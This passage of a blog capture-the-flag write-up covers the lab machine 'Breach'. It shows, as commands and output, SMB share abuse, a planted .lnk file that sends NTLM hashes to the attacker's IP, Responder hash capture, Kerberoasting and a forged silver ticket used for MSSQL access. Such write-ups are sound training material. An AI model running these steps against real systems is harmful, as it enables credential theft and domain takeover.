<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Breach (Windows Medium) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive a user hash. This hash is used to kerberoast SPNs which gets">
<meta property="og:type" content="article">
<meta property="og:title" content="Breach (Windows Medium)">
<meta property="og:url" content="https://d34db33fb04h.github.io/2025/03/28/Breach/index.html">
<meta property="og:site_name" content="SidePieceVillage">
<meta property="og:description" content="Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive a user hash. This hash is used to kerberoast SPNs which gets">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://d34db33fb04h.github.io/img/breach.jpg">
<meta property="article:published_time" content="2025-03-28T16:42:53.000Z">
<meta property="article:modified_time" content="2025-04-07T14:42:42.676Z">
<meta property="article:author" content="Jay">
<meta property="article:tag" content="ntlm theft">
<meta property="article:tag" content="kerberoasting SPNs">
<meta property="article:tag" content="silver ticket">
<meta property="article:tag" content="mssql">
<meta property="article:tag" content="amsi-bypass">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://d34db33fb04h.github.io/img/breach.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Breach (Windows Medium)",
  "url": "https://d34db33fb04h.github.io/2025/03/28/Breach/",
  "image": "https://d34db33fb04h.github.io/img/breach.jpg",
  "datePublished": "2025-03-28T16:42:53.000Z",
  "dateModified": "2025-04-07T14:42:42.676Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/03/28/Breach/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Breach (Windows Medium)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Breach (Windows Medium)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Breach (Windows Medium)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-28T16:42:53.000Z" title="Created 2025-03-28 11:42:53">2025-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-07T14:42:42.676Z" title="Updated 2025-04-07 09:42:42">2025-04-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vl/">vl</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a <code>lnk</code> file and receive a user hash. This hash is used to kerberoast SPNs which gets a hash for <code>svc_mssql</code> user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator to a MSSQL instance and can run commands via <code>xp_cmdshell</code>. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have <code>SeImpersonate</code> available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm.</p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Trying as <code>Guest</code> allows us access to the <code>share</code> on the DC.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.92.126 -u Guest -p &#x27;&#x27; --shares</span><br><span class="line"></span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         [+] breach.vl\Guest: </span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         [*] Enumerated shares</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         Share           Permissions     Remark</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         -----           -----------     ------</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         C$                              Default share</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         NETLOGON                        Logon server share </span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         share           READ,WRITE      </span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         SYSVOL                          Logon server share </span><br><span class="line">SMB         10.10.92.126    445    BREACHDC         Users           READ </span><br></pre></td></tr></table></figure>
<p>We have read&#x2F;write to the share. Looking over it we see some directories we can access.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">smbmap -u Guest -p &#x27;&#x27; -d breach.vl -H 10.10.92.126 -R share</span><br><span class="line">[+] IP: 10.10.92.126:445        Name: breachdc.breach.vl                                </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        share                                                   READ, WRITE</span><br><span class="line">        .\share\*</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:29:56 2025    .</span><br><span class="line">        dr--r--r--                0 Thu Feb 17 09:38:00 2022    ..</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:25:05 2025    finance</span><br><span class="line">        dr--r--r--                0 Thu Feb 17 05:19:13 2022    software</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:25:26 2025    transfer</span><br><span class="line">        .\share\finance\*</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:25:05 2025    .</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..</span><br><span class="line">        .\share\software\*</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:25:17 2025    .</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..</span><br><span class="line">        .\share\transfer\*</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:25:26 2025    .</span><br><span class="line">        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..</span><br><span class="line">        dr--r--r--                0 Thu Feb 17 05:23:51 2022    claire.pope</span><br><span class="line">        dr--r--r--                0 Thu Feb 17 05:23:22 2022    diana.pope</span><br><span class="line">        dr--r--r--                0 Thu Feb 17 05:24:39 2022    julia.wong</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/img/perfect.gif"></p>
<h3 id="NTLM-Theft"><a href="#NTLM-Theft" class="headerlink" title="NTLM Theft"></a>NTLM Theft</h3><p>We can drop and <code>scf or lnk</code> file and see if we can any clicks.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ python3 ntlm_theft.py --generate lnk --server 10.8.4.29 --filename freeCandy</span><br><span class="line">Created: freeCandy/freeCandy.lnk (BROWSE TO FOLDER)</span><br><span class="line">Generation Complete.</span><br><span class="line"></span><br><span class="line">$ impacket-smbclient &#x27;breach.vl/Guest@breach.vl&#x27; -no-pass</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># shares                                                   </span><br><span class="line">ADMIN$                                                     </span><br><span class="line">C$                                                         </span><br><span class="line">IPC$                                                       </span><br><span class="line">NETLOGON                                                   </span><br><span class="line">share                                                      </span><br><span class="line">SYSVOL                                                     </span><br><span class="line">Users                                                      </span><br><span class="line"># use share                                                </span><br><span class="line"># ls                                                       </span><br><span class="line">drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 .</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 09:38:00 2022 ..</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 05:19:36 2022 finance</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 05:19:13 2022 software</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 transfer</span><br><span class="line"># cd transfer                                              </span><br><span class="line"># ls                                                       </span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .</span><br><span class="line">drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 ..</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope </span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope</span><br><span class="line">drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong</span><br><span class="line"># put freeCandy.lnk                                        </span><br><span class="line"># exit</span><br></pre></td></tr></table></figure>
<p>And we can put it in the <code>transfer</code> folder where the users are at. After we setup responder and see if we get a hit.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I tun0</span><br><span class="line"></span><br><span class="line">[+] Listening for events...</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.92.126</span><br><span class="line">[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:0526add1eaef5104:1DD6932CED548FA48BD4BED2516A3E02:01010000000000008061771E4D9FDB018B3185DF3D296F610000000002000800570041004100560001001E00570049004E002D00360042003100300033004F00470059004D004B&lt;SNIP&gt;</span><br><span class="line">[*] Skipping previously captured hash for BREACH\Julia.Wong </span><br></pre></td></tr></table></figure>
<p><img src="/img/yes.gif"><br>Once cracked, we can get a dump for bloodhound. After getting a list of users.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb breach.vl -u julia.wong -p &lt;SNIP&gt; --rid-brute | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.list</span><br></pre></td></tr></table></figure>

<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Following general rule of thumb, when we have credentials we try kerberoasting. We can see if we have any SPNs associated with this user.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27;         </span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">--------------------------------  ---------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             </span><br><span class="line"></span><br><span class="line">$ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27; -request-user svc_mssql</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">--------------------------------  ---------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$94460cab00e138498318d889ae9d858d$ebfbc9219ec245123242aa4a3b5408c548d7dd7afb1926b61936c422b74fed99f0414f59d3cad89f18afc227c4d0275048a11c91816eae8248d9fa69e1f30ccb77b76020f07ea4452f2af9352e1817f92a9758a4099e76402df858ecb54abb9f170179107dff4fb442b7a5437a348476398b0459&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>And we get a hit on <code>svc_mssql</code>, when we crack the hash we get a clear text cred we can use against the open port 1433&#x2F;mssql.</p>
<h3 id="Silver-Ticket-Attack"><a href="#Silver-Ticket-Attack" class="headerlink" title="Silver Ticket Attack"></a>Silver Ticket Attack</h3><p>Since we have valid credentials to a service account(MSSQL). We can create a <code>silver ticket</code> which will give us administrative rights when we connect to the mssql instance. If we did it now we wouldn’t have the ability to run commands. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-mssqlclient &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;@breach.vl&#x27; -windows-auth</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (BREACH\svc_mssql  guest@master)&gt; enable_xp_cmdshell</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br><span class="line">SQL (BREACH\svc_mssql  guest@master)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/tickets.gif"><br>So we use <code>impacket-ticketer</code> to create our ticket. First we need to convert the password to a nthash with a converter online. Then we must get the domain sid. We can obtain that a couple of ways, using impacket tools such as <code>lookupsid</code>, <code>getPac</code>, <code>nxc</code>, bloodhound data. Then we create our ticket. Ensure to use <code>//</code> when entering the service or you will get an error when kerberos looks for the ticket. <em>This is in some cases, at least it was for me</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-getPac &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;&#x27; -targetUser &#x27;svc_mssql&#x27;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">ResourceGroupDomainSid:          NULL           </span><br><span class="line">ResourceGroupCount:              0                                                                                    </span><br><span class="line">ResourceGroupIds:                NULL                                                                                 </span><br><span class="line">Domain SID: S-1-5-21-2330692793-3312915120-706255856 </span><br><span class="line"></span><br><span class="line">$ impacket-ticketer -nthash &#x27;0006C7AA1E800E17F8E78870E2000&#x27; -spn &#x27;MSSQLSvc//breachdc.breach.vl:1433&#x27; -domain &#x27;breach.vl&#x27; -domain-sid &#x27;S-1-5-21-2330692793-3312915120-706255856&#x27; -user-id &#x27;500&#x27; Administrator</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line">                                                           </span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos </span><br><span class="line">[*] Customizing ticket for breach.vl/Administrator</span><br><span class="line">[*] PAC_LOGON_INFO </span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart                                </span><br><span class="line">[*] Signing/Encrypting final ticket    </span><br><span class="line">[*]     PAC_SERVER_CHECKSUM                             </span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>
<p>After creation, we can export it and connect using kerberos.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=Administrator.ccache</span><br><span class="line">$ impacket-mssqlclient -dc-ip 10.10.112.98 -k -no-pass &#x27;breach.vl/Administrator@breach.vl&#x27; -windows-auth -debug</span><br><span class="line">Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[+] Using Kerberos Cache: Administrator.ccache </span><br><span class="line">[+] SPN MSSQLSVC/:1433@BREACH.VL not found in cache       </span><br><span class="line">[+] AnySPN is True, looking for another suitable SPN   </span><br><span class="line">[+] Returning cached credential for MSSQLSVC/@BREACH.VL  </span><br><span class="line">[+] Using TGS from cache                                  </span><br><span class="line">[+] Changing sname from MSSQLSvc/@BREACH.VL to MSSQLSVC/:1433@BREACH.VL and hoping for the best</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english </span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] 